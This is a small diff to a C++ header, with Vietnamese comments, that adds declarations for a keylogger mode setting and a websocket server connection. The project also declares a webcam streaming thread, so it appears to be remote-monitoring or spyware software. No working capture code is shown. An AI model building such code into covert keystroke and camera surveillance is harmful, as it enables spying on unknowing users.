@@ -53,6 +53,12 @@ extern std::set<DWORD> g_PendingModifiers;
 extern bool g_IsStreaming;
 extern std::thread* g_WebcamThread;
 
+// Keylogger Mode: "buffer" hoặc "realtime"
+extern std::string g_KeylogMode;
+extern server* g_ServerPtr;
+extern websocketpp::connection_hdl g_ClientHdl;
+extern bool g_ClientConnected;
+
 // KHAI BÁO HÀM TIỆN ÍCH
 std::string ToLower(std::string str);
 bool IsKeyDown(int vk);
